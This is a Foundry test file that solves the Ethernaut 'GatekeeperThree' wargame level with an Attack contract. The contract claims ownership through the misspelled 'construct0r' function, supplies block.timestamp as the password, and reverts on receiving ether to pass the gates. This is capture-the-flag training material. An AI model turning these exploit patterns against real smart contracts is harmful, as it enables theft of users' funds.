// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test, console} from "forge-std/Test.sol";
import {StdCheats} from "forge-std/StdCheats.sol";
import "../src/GatekeeperThree/GatekeeperThreeFactory.sol";
import "../src/Ethernaut.sol";

contract GatekeeperThreeTest is StdCheats, Test {
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
    }

    function testGatekeeperThreeHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        GatekeeperThreeFactory gatekeeperThreeFactory = new GatekeeperThreeFactory();
        ethernaut.registerLevel(gatekeeperThreeFactory);
        vm.prank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(gatekeeperThreeFactory);
        GatekeeperThree gatekeeperThree = GatekeeperThree(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        (bool success,) = address(gatekeeperThree).call{value: 0.01 ether}("");
        require(success, "Attack failed");
        Attack attack = new Attack(payable(address(gatekeeperThree)));
        attack.attack();

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        vm.prank(tx.origin);
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        assert(levelSuccessfullyPassed);
    }
}

contract Attack {
    GatekeeperThree public target;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function attack() public {
        target.construct0r();
        target.createTrick();
        target.getAllowance(block.timestamp);
        target.enter();
    }

    receive() external payable {
        revert("This contract does not accept payments");
    }
}
